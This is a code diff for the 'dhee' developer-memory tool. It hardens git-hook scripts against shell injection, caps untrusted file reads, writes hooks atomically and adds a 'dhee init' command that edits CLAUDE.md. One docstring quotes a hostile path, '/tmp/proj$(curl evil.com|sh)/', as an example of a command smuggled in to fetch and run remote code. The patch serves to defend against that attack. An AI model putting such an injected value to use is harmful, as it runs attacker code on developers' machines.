@@ -380,13 +380,52 @@ def refresh_manifest(repo_root: Path) -> Dict[str, Any]:
     return manifest
 
 
+# Hard ceilings on what we'll accept from a git-tracked entries.jsonl.
+# A malicious teammate's PR could otherwise ship a multi-gigabyte file
+# that OOMs the dev's machine the next time `dhee context refresh`
+# fires from a post-merge hook.
+_ENTRIES_FILE_MAX_BYTES = 32 * 1024 * 1024  # 32 MiB
+_ENTRIES_LINE_MAX_BYTES = 256 * 1024        # 256 KiB / entry
+_ENTRIES_MAX_LINES = 50_000
+
+
 def _iter_entries(repo_root: Path) -> Iterable[Entry]:
+    """Stream entries from the repo's ``entries.jsonl``.
+
+    SECURITY: this file is git-tracked, so its contents come from
+    *every* dev who has ever pushed to the repo (and from anyone the
+    dev has cloned from on the public internet). We treat it as
+    untrusted bulk data and apply three caps:
+
+    * total file size (``_ENTRIES_FILE_MAX_BYTES``) — refuse to read
+      past the cap; truncate cleanly without raising.
+    * per-line size (``_ENTRIES_LINE_MAX_BYTES``) — skip individual
+      huge lines so one malformed entry can't OOM us.
+    * line count (``_ENTRIES_MAX_LINES``) — stop after a reasonable
+      number; entries.jsonl with millions of rows is not real usage.
+
+    The caps are conservative; real teams should never approach them.
+    """
     path = repo_entries_path(repo_root)
     if not path.exists():
         return
     try:
-        with path.open("r", encoding="utf-8") as fh:
+        size = path.stat().st_size
+    except OSError:
+        return
+    try:
+        with path.open("r", encoding="utf-8", errors="replace") as fh:
+            bytes_read = 0
+            line_count = 0
             for line in fh:
+                bytes_read += len(line.encode("utf-8", errors="replace"))
+                line_count += 1
+                if bytes_read > _ENTRIES_FILE_MAX_BYTES:
+                    return
+                if line_count > _ENTRIES_MAX_LINES:
+                    return
+                if len(line) > _ENTRIES_LINE_MAX_BYTES:
+                    continue
                 line = line.strip()
                 if not line:
                     continue
@@ -399,6 +438,9 @@ def _iter_entries(repo_root: Path) -> Iterable[Entry]:
                 yield Entry.from_json(raw)
     except OSError:
         return
+    # ``size`` is captured up-front so reads of a file growing under us
+    # still terminate at the original observed size.
+    _ = size  # noqa: F841 — preserved for future capped-mmap path
 
 
 def _append_entry(repo_root: Path, entry: Entry) -> None:
@@ -541,16 +583,30 @@ _HOOK_MARKER = "# dhee-managed"
 
 
 def _hook_body(repo_root: Path, name: str) -> str:
+    """Render a git-hook script body.
+
+    SECURITY: ``repo_root`` is *never* interpolated into the shell. An
+    earlier version embedded the path in double quotes like
+    ``--repo "{repo_root}"`` — but a repo cloned at e.g.
+    ``/tmp/proj$(curl evil.com|sh)/`` would then execute arbitrary code
+    on every ``git pull``/``git push``. The hook now resolves the repo
+    root at runtime via ``git rev-parse --show-toplevel`` and passes it
+    to ``dhee`` as a single env-quoted argument. ``repo_root`` here is
+    only used in the hook's *comments* (which are never executed).
+    """
+    safe_comment = str(repo_root).replace("\n", " ").replace("\r", " ")
     if name == "pre-push":
         return (
             "#!/bin/sh\n"
             f"{_HOOK_MARKER}\n"
             "# Prevents pushing divergent Dhee shared-context heads.\n"
-            f'dhee context check --repo "{repo_root}" --quiet >/dev/null 2>&1\n'
+            f"# Repo: {safe_comment}\n"
+            'DHEE_REPO_ROOT="$(git rev-parse --show-toplevel 2>/dev/null)"\n'
+            '[ -z "$DHEE_REPO_ROOT" ] && exit 0\n'
+            'dhee context check --repo "$DHEE_REPO_ROOT" --quiet >/dev/null 2>&1\n'
             "status=$?\n"
             'if [ "$status" -ne 0 ]; then\n'
-            '  echo "Dhee shared context has unresolved conflicts. Run: dhee context check --repo '
-            f"'{repo_root}'" + '" >&2\n'
+            '  printf "Dhee shared context has unresolved conflicts. Run: dhee context check\\n" >&2\n'
             "  exit $status\n"
             "fi\n"
         )
@@ -558,7 +614,10 @@ def _hook_body(repo_root: Path, name: str) -> str:
         "#!/bin/sh\n"
         f"{_HOOK_MARKER}\n"
         "# Refreshes Dhee repo-context after a git update. Safe to remove.\n"
-        f'dhee context refresh --repo "{repo_root}" --quiet >/dev/null 2>&1 || true\n'
+        f"# Repo: {safe_comment}\n"
+        'DHEE_REPO_ROOT="$(git rev-parse --show-toplevel 2>/dev/null)"\n'
+        '[ -z "$DHEE_REPO_ROOT" ] && exit 0\n'
+        'dhee context refresh --repo "$DHEE_REPO_ROOT" --quiet >/dev/null 2>&1 || true\n'
     )
 
 
@@ -579,6 +638,37 @@ def _hooks_dir(repo_root: Path) -> Optional[Path]:
                     gitdir = (repo_root / gitdir).resolve()
                 return gitdir / "hooks"
     return None
+
+
+def _atomic_write_hook(path: Path, body: str) -> None:
+    """Atomically write a hook with mode 0o755 set from creation.
+
+    SECURITY: a plain ``write_text`` followed by ``chmod`` has a small
+    window where the file exists with the umask-default mode. On a
+    multi-user box that's a TOCTOU window where another local user
+    could open the descriptor before we tighten perms. We instead
+    create a temp file in the same dir, set 0o755 via ``os.chmod``
+    *before* the rename, then atomically rename onto the target.
+    ``os.replace`` swaps the directory entry — even if the target is
+    a symlink, the symlink is replaced (not followed), so we never
+    write through an attacker-planted link.
+    """
+    import tempfile as _tempfile
+
+    path.parent.mkdir(parents=True, exist_ok=True)
+    fd, tmp = _tempfile.mkstemp(prefix=f".{path.name}.", dir=str(path.parent))
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as f:
+            f.write(body)
+        os.chmod(tmp, 0o755)
+        os.replace(tmp, path)
+    except Exception:
+        if os.path.exists(tmp):
+            try:
+                os.unlink(tmp)
+            except OSError:
+                pass
+        raise
 
 
 def install_hooks(repo_root: Path) -> List[str]:
@@ -602,37 +692,44 @@ def install_hooks(repo_root: Path) -> List[str]:
             existing = hook.read_text(encoding="utf-8", errors="replace")
             if _HOOK_MARKER in existing:
                 # Already ours — refresh in case the path changed.
-                hook.write_text(body, encoding="utf-8")
-                hook.chmod(0o755)
+                _atomic_write_hook(hook, body)
                 installed.append(name)
                 continue
             # User hook present — preserve it and chain.
             user_copy = hooks_dir / f"{name}.user"
             if not user_copy.exists():
-                user_copy.write_text(existing, encoding="utf-8")
-                user_copy.chmod(0o755)
+                _atomic_write_hook(user_copy, existing)
+            # SECURITY: ``user_copy`` lives in the same hooks dir; we
+            # build its path at runtime in the hook (relative to
+            # ``$0``) so neither ``repo_root`` nor ``user_copy`` is
+            # ever interpolated into the script. See _hook_body for
+            # the full rationale.
             chained = (
                 "#!/bin/sh\n"
                 f"{_HOOK_MARKER}\n"
-                f'"{user_copy}" "$@"\n'
-                "status=$?\n"
+                f'HOOK_DIR="$(cd "$(dirname "$0")" && pwd)"\n'
+                f'USER_HOOK="$HOOK_DIR/{name}.user"\n'
+                'if [ -x "$USER_HOOK" ]; then\n'
+                '  "$USER_HOOK" "$@"\n'
+                "  status=$?\n"
                 + (
-                    'if [ "$status" -ne 0 ]; then exit "$status"; fi\n'
+                    '  if [ "$status" -ne 0 ]; then exit "$status"; fi\n'
                     if name == "pre-push"
                     else ""
                 )
+                + "fi\n"
+                'DHEE_REPO_ROOT="$(git rev-parse --show-toplevel 2>/dev/null)"\n'
+                '[ -z "$DHEE_REPO_ROOT" ] && exit 0\n'
                 + (
-                    f'dhee context check --repo "{repo_root}" --quiet >/dev/null 2>&1 || exit $?\n'
+                    'dhee context check --repo "$DHEE_REPO_ROOT" --quiet >/dev/null 2>&1 || exit $?\n'
                     if name == "pre-push"
-                    else f'dhee context refresh --repo "{repo_root}" --quiet >/dev/null 2>&1 || true\n'
+                    else 'dhee context refresh --repo "$DHEE_REPO_ROOT" --quiet >/dev/null 2>&1 || true\n'
                 )
             )
-            hook.write_text(chained, encoding="utf-8")
-            hook.chmod(0o755)
+            _atomic_write_hook(hook, chained)
             installed.append(name)
         else:
-            hook.write_text(body, encoding="utf-8")
-            hook.chmod(0o755)
+            _atomic_write_hook(hook, body)
             installed.append(name)
     return installed
 
@@ -715,6 +812,335 @@ def link(path: str | os.PathLike[str] = ".") -> Dict[str, Any]:
         "repo_id": repo_id,
         "hooks": hooks,
         "manifest": _read_json(repo_manifest_path(repo_root), {}),
+    }
+
+
+# ---------------------------------------------------------------------------
+# `dhee init` — the developer's one-command on-ramp.
+# ---------------------------------------------------------------------------
+#
+# `link()` is the low-level primitive: registers a repo, drops the .dhee/
+# skeleton, installs hooks. `init()` is the *product* on top of it. From
+# inside any git checkout, `dhee init` should leave the developer with:
+#
+#   * the repo wired to their personal cross-repo brain
+#   * the repo's existing markdown (README, ARCHITECTURE, docs/) indexed
+#     so Dhee can recall from it without the agent re-reading the file
+#   * a marker-bracketed `## Dhee` section in CLAUDE.md so any harness
+#     that loads CLAUDE.md (Claude Code, Codex, …) picks up Dhee's tools
+#     immediately
+#   * a "first-light" digest printed to the terminal so the dev sees the
+#     brain working on day one — empty if there is genuinely nothing to
+#     show, never a fake reassurance
+#
+# Re-running `dhee init` is fully idempotent: SHA-skip on unchanged
+# files, marker-bracketed CLAUDE.md edit, no duplicate hook entries,
+# no extra registry rows. The dev can run it as often as they want.
+
+DHEE_CLAUDE_MD_START = "<!-- dhee:start -->"
+DHEE_CLAUDE_MD_END = "<!-- dhee:end -->"
+
+_CLAUDE_MD_BODY = """\
+## Dhee — shared developer brain
+
+This repo is wired to Dhee. Two layers, both already on:
+
+- **Personal brain** (`~/.dhee/`) — every repo on this machine that ran
+  `dhee init`. The agent can recall context from one repo while working
+  in another.
+- **Team brain** (`<repo>/.dhee/`) — git-tracked. Anything you `dhee
+  promote` ships with the next push; teammates see it on `git pull`.
+
+### Use Dhee's MCP tools first
+
+Before reconstructing context from raw reads or shell output, prefer:
+
+- `mcp__dhee__context` once at conversation start — last session, active
+  intentions, top memories.
+- `mcp__dhee__recall` for "what did we decide about X?" / "did we already
+  hit this bug?".
+- `mcp__dhee__dhee_read` instead of native `Read` for files that might
+  be large (it returns a digest + stores raw under a pointer; expand
+  only when the digest isn't enough).
+- `mcp__dhee__dhee_bash` instead of native `Bash` for commands that
+  might produce heavy output (git log, pytest, find, grep).
+
+### Team rules
+
+<!-- Edit below. Anything between the dhee:start/end markers is
+     managed by `dhee init` and will be regenerated on update. Add team
+     rules, gotchas, and architectural decisions outside the markers. -->
+"""
+
+
+def _claude_md_path(repo_root: Path) -> Path:
+    return repo_root / "CLAUDE.md"
+
+
+def _build_dhee_section() -> str:
+    return f"{DHEE_CLAUDE_MD_START}\n{_CLAUDE_MD_BODY.rstrip()}\n{DHEE_CLAUDE_MD_END}\n"
+
+
+def write_claude_md(repo_root: Path) -> Tuple[bool, bool]:
+    """Idempotently write the Dhee section into ``<repo>/CLAUDE.md``.
+
+    Returns ``(created, updated)``:
+
+    * ``created`` — True when the file did not exist and we wrote a fresh
+      one (with just our section + a leading H1).
+    * ``updated`` — True when the existing file was rewritten (markers
+      replaced, or markers added because the file didn't have any).
+      False on a perfect no-op (markers present + body matches).
+
+    The dev's content above and below the marker block is preserved
+    verbatim; we only rewrite what's between the markers.
+
+    SECURITY: refuse to write through a symlink whose target escapes
+    the repo. ``<repo>/CLAUDE.md`` being a symlink to e.g.
+    ``/etc/cron.d/something`` would otherwise let a malicious repo
+    redirect Dhee's write to a path outside the dev's control.
+    """
+    path = _claude_md_path(repo_root)
+
+    if path.exists() or path.is_symlink():
+        try:
+            real = path.resolve()
+            repo_real = repo_root.resolve()
+            # The resolved CLAUDE.md must live inside the repo root.
+            real.relative_to(repo_real)
+        except (ValueError, OSError):
+            raise ValueError(
+                f"refusing to write CLAUDE.md: {path} resolves outside "
+                f"the repo root ({repo_root}). Investigate the symlink "
+                "before re-running `dhee init`."
+            )
+
+    section = _build_dhee_section()
+
+    if not path.exists():
+        header = f"# {repo_root.name}\n\n"
+        path.write_text(header + section, encoding="utf-8")
+        return True, False
+
+    existing = path.read_text(encoding="utf-8")
+    start = existing.find(DHEE_CLAUDE_MD_START)
+    end = existing.find(DHEE_CLAUDE_MD_END)
+
+    if start != -1 and end != -1 and end > start:
+        # Boundary handling: section already terminates with a newline.
+        # Swallow exactly one trailing newline after the end marker (if
+        # present) so we don't double up on re-runs. Anything beyond
+        # that newline (more user content) is preserved verbatim.
+        end_after = end + len(DHEE_CLAUDE_MD_END)
+        if end_after < len(existing) and existing[end_after] == "\n":
+            end_after += 1
+        rebuilt = existing[:start] + section + existing[end_after:]
+        if rebuilt == existing:
+            return False, False
+        path.write_text(rebuilt, encoding="utf-8")
+        return False, True
+
+    # Markers absent — append to the file with a separating blank line.
+    suffix = "" if existing.endswith("\n") else "\n"
+    rebuilt = existing + suffix + "\n" + section
+    path.write_text(rebuilt, encoding="utf-8")
+    return False, True
+
+
+def _ingest_repo_markdown(repo_root: Path, *, max_chunks: int) -> Dict[str, Any]:
+    """Run the extended markdown ingest. Best-effort — never raises.
+
+    Returns a summary dict the CLI prints. On any failure (no embeddings
+    configured, network hiccup, etc.) returns an empty-but-valid summary
+    so init() always succeeds.
+    """
+    try:
+        from dhee.cli_config import get_memory_instance
+        from dhee.hooks.claude_code.ingest import init_ingest_project
+    except Exception as exc:  # noqa: BLE001
+        return {
+            "status": "skipped",
+            "reason": f"ingest_unavailable: {exc.__class__.__name__}",
+            "files_indexed": 0,
+            "chunks_stored": 0,
+        }
+
+    try:
+        memory = get_memory_instance(None)
+    except Exception as exc:  # noqa: BLE001
+        # Most common cause: no provider/API key configured yet. We do
+        # not want `dhee init` to fail here — devs should be able to
+        # link a repo before they paste a key.
+        return {
+            "status": "skipped",
+            "reason": "memory_unavailable",
+            "detail": str(exc)[:120],
+            "files_indexed": 0,
+            "chunks_stored": 0,
+        }
+
+    try:
+        results, prune_summary = init_ingest_project(memory, repo_root, max_chunks=max_chunks)
+    except Exception as exc:  # noqa: BLE001
+        return {
+            "status": "error",
+            "reason": exc.__class__.__name__,
+            "detail": str(exc)[:200],
+            "files_indexed": 0,
+            "chunks_stored": 0,
+        }
+
+    chunks_stored = sum(int(getattr(r, "chunks_stored", 0) or 0) for r in results)
+    # `chunks_deleted` here = chunks of files that *changed* and got
+    # re-ingested (handled per-file by ingest_file). Pruned chunks (for
+    # files that no longer exist at all) come from the prune_summary.
+    chunks_replaced = sum(int(getattr(r, "chunks_deleted", 0) or 0) for r in results)
+    files_indexed = sum(1 for r in results if not getattr(r, "skipped", False))
+    files_unchanged = sum(1 for r in results if getattr(r, "skipped", False) and getattr(r, "reason", "") == "unchanged")
+    files_skipped_cap = sum(1 for r in results if getattr(r, "reason", "") == "chunk_cap_reached")
+
+    return {
+        "status": "ok",
+        "files_indexed": files_indexed,
+        "files_unchanged": files_unchanged,
+        "files_skipped_cap": files_skipped_cap,
+        "chunks_stored": chunks_stored,
+        "chunks_replaced": chunks_replaced,
+        "files_pruned": int(prune_summary.get("files_pruned", 0) or 0),
+        "chunks_pruned": int(prune_summary.get("chunks_deleted", 0) or 0),
+        "files_seen": len(results),
+    }
+
+
+def _first_light_digest(repo_root: Path, *, repo_id: str) -> Dict[str, Any]:
+    """Run a few calibrated queries against the personal brain so the
+    dev sees the brain working immediately after init.
+
+    Honest empty when there's nothing real to surface — no filler. The
+    caller renders this as "From your other repos:" or "No cross-repo
+    learnings yet — they'll appear as you work."
+    """
+    try:
+        from dhee.cli_config import get_memory_instance
+    except Exception:
+        return {"status": "skipped", "reason": "memory_unavailable", "hits": []}
+
+    try:
+        memory = get_memory_instance(None)
+    except Exception:
+        return {"status": "skipped", "reason": "memory_unavailable", "hits": []}
+
+    repo_name = repo_root.name.replace("-", " ").replace("_", " ")
+    queries = [
+        f"key decisions or gotchas in {repo_name}",
+        f"how we set up tests / build / deploy in {repo_name}",
+        f"architectural patterns this codebase uses",
+    ]
+
+    seen_ids: set[str] = set()
+    hits: List[Dict[str, Any]] = []
+    for q in queries:
+        try:
+            search = memory.search(query=q, limit=3, user_id=os.environ.get("DHEE_USER_ID", "default"))
+        except Exception:
+            continue
+        rows = search.get("results") if isinstance(search, dict) else search
+        if not rows:
+            continue
+        for row in rows:
+            if not isinstance(row, dict):
+                continue
+            mid = str(row.get("id") or "")
+            if mid and mid in seen_ids:
+                continue
+            score = float(row.get("score", 0.0) or 0.0)
+            if score and score < 0.55:
+                continue
+            text = str(row.get("memory") or row.get("content") or "").strip()
+            if not text:
+                continue
+            source_path = ""
+            metadata = row.get("metadata") if isinstance(row.get("metadata"), dict) else {}
+            if isinstance(metadata, dict):
+                source_path = str(metadata.get("source_path") or "")
+            # Skip hits whose source is *this* repo — we want cross-repo
+            # surprises, not "your own README".
+            if source_path and str(repo_root) in source_path:
+                continue
+            seen_ids.add(mid)
+            hits.append({
+                "memory_id": mid,
+                "score": round(score, 3),
+                "text": text,
+                "source_path": source_path,
+                "query": q,
+            })
+            if len(hits) >= 3:
+                break
+        if len(hits) >= 3:
+            break
+
+    return {"status": "ok" if hits else "empty", "hits": hits}
+
+
+def init(
+    path: str | os.PathLike[str] = ".",
+    *,
+    max_chunks: int = 200,
+    skip_ingest: bool = False,
+    skip_first_light: bool = False,
+) -> Dict[str, Any]:
+    """One-command on-ramp: link + index + write CLAUDE.md + first-light.
+
+    Idempotent. Re-runs are cheap (SHA-skip on unchanged files,
+    marker-bracketed CLAUDE.md edit, no duplicate hook entries).
+
+    Returns a rich result dict with one key per stage. The CLI prints
+    each section honestly — empty stages render as "no change", not
+    fake reassurance.
+    """
+    target = _resolve(path)
+    repo_root = _git_top(target)
+    if repo_root is None:
+        raise ValueError(
+            f"{target} is not inside a git repository. "
+            "Run `git init` first, then `dhee init`."
+        )
+
+    link_info = link(repo_root)
+    repo_id = str(link_info.get("repo_id") or "")
+
+    # Write CLAUDE.md first so it's part of the very first ingest pass.
+    # Otherwise the second run would chunk the freshly-written CLAUDE.md
+    # and re-runs wouldn't be true no-ops.
+    claude_created, claude_updated = write_claude_md(repo_root)
+
+    ingest_summary: Dict[str, Any]
+    if skip_ingest:
+        ingest_summary = {"status": "skipped", "reason": "skip_ingest", "files_indexed": 0, "chunks_stored": 0}
+    else:
+        ingest_summary = _ingest_repo_markdown(repo_root, max_chunks=max_chunks)
+
+    if skip_first_light:
+        first_light = {"status": "skipped", "reason": "skip_first_light", "hits": []}
+    else:
+        first_light = _first_light_digest(repo_root, repo_id=repo_id)
+
+    linked_count = len(list_links())
+
+    return {
+        "repo_root": str(repo_root),
+        "repo_id": repo_id,
+        "linked_repos": linked_count,
+        "hooks": link_info.get("hooks") or [],
+        "claude_md": {
+            "path": str(_claude_md_path(repo_root)),
+            "created": claude_created,
+            "updated": claude_updated,
+            "unchanged": not claude_created and not claude_updated,
+        },
+        "ingest": ingest_summary,
+        "first_light": first_light,
     }
 
 
